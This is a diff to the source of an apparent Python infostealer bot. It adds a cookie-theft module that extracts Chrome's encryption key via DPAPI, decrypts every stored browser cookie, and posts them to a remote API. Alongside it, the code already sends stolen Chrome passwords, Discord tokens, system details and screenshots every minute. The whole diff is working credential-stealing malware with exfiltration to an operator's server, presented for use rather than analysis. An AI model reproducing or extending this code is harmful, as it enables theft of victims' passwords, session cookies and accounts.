@@ -106,7 +106,6 @@ class ApiController():
             bt = datetime.fromtimestamp(boot_time_timestamp)
 
             post_data = {
-                "token" : token,
                 "operating_system": uname.system,
                 "node_name": uname.node,
                 "release": uname.release,
@@ -118,20 +117,26 @@ class ApiController():
                 "memory": self.get_size(psutil.virtual_memory().total)
             }
 
-            requests.post(f"{self.api_url}/update/details/{identifier}", json=post_data)
+            requests.post(f"{self.api_url}/update/details/{identifier}/{token}", json=post_data)
 
     def update_chrome(self, identifier, token, data):
         if self.check_connection():
             for d in data:
                 post_data = {
-                    "token": token,
-                    "identifier": identifier,
                     "host": d["host"],
                     "user": d["user"],
                     "password": d["pass"]
                 }
 
-                requests.post(f"{self.api_url}/update/chrome/{identifier}", json=post_data)
+                requests.post(f"{self.api_url}/update/chrome/{identifier}/{token}", json=post_data)
+
+    def update_cookies(self, identifier, token, data):
+        if self.check_connection():
+            post_data = {
+                "cookies": data
+            }
+
+            requests.post(f"{self.api_url}/update/cookies/{identifier}/{token}", json=post_data)
 
     def update_discord(self, identifier, token, data):
         if self.check_connection():
@@ -226,6 +231,63 @@ class Chrome(object):
             pass
         return self.stored
 
+class Cookies(object):
+    def __init__(self):
+        self.stored = ""
+        self.lad = os.environ["LOCALAPPDATA"]
+        self.temp = os.environ["APPDATA"] + "Angst"
+
+    def chrome_key(self):
+        with open(os.path.join(self.lad,
+                                "Google\\Chrome\\User Data\\Local State"),
+                 encoding="utf-8") as k:
+            ck = json.loads(k.read())
+        return win32crypt.CryptUnprotectData(
+                    base64.b64decode(ck["os_crypt"]["encrypted_key"])[5:],
+                    None,
+                    None,
+                    None,
+                    0)[1]
+
+    def locate_db(self):
+        full_path = os.path.join(APP_DATA, 'Google\\Chrome\\User Data\\Default\\Cookies')
+        temp_path = os.path.join(APP_DATA,'sqlite_file')
+        if os.path.exists(full_path): os.remove(temp_path)
+        shutil.copyfile(full_path, temp_path)
+        return full_path
+
+    def decrypt_pass(self, cont):
+        try:
+            iv = cont[3:15]
+            data = cont[15:]
+            ciph = AES.new(self.chrome_key(), AES.MODE_GCM, iv)
+
+            decrypted = ciph.decrypt(data)
+            decrypted = decrypted[:-16].decode()
+            return decrypted
+        except Exception as e:
+            data = win32crypt.CryptUnprotectData(
+                    cont,
+                    None,
+                    None,
+                    None,
+                    0)
+            return data
+
+    def dump(self):
+        try:
+            db = self.locate_db()
+            db2 = shutil.copy(db, APP_DATA)
+            conn = sqlite3.connect(db2)
+            cursor = conn.cursor()
+            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+            for item in cursor.fetchall():
+                if item[0] != "":
+                    self.stored += f"HOST: {item[0]}\nNAME: {item[1]}\nCOOKIE: {self.decrypt_pass(item[2])}\n\n"
+        except Exception as e:
+            pass
+        return self.stored
+
 class Discord():
     def __init__(self):
         self.tokens = []
@@ -267,7 +329,7 @@ class Discord():
     def neatify(self):
         self.discord()
         for token in set(self.tokens):
-            self.saved += "TOKEN:%s\n" % token
+            self.saved += "TOKEN: %s\n" % token
 
     def dump(self):
         self.neatify()
@@ -296,9 +358,10 @@ def main():
                     
                     if api.check_account(bot_identifier, bot_token):
                         schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
-                        schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
-                        schedule.every(1).minutes.do(api.update_discord, bot_identifier, bot_token, Discord().dump())
                         schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
+                        schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
+                        schedule.every(1).minutes.do(api.update_cookies, bot_identifier, bot_token, Cookies().dump())
+                        schedule.every(1).minutes.do(api.update_discord, bot_identifier, bot_token, Discord().dump())
 
                         while True:
                             schedule.run_pending()
